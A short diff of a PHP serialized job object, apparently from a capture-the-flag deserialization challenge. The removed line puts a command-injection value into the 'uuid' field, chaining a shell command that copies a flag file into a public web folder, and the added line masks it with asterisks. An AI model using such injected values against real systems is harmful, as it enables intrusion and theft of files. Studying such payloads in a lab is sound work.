@@ -20,7 +20,7 @@ O:15:"App\Jobs\rmFile":1:{
         "command": {
             "fileQueue": {
                 "filePath": "/src/955c2c12-5d28-4e77-bdf8-5519336d9758.txt",
-                "uuid": "xyzf;cat /flag > /www/public/src/flag777", 
+                "uuid": "xyzf********************************", 
                 "ext": "txt"
             }
         }
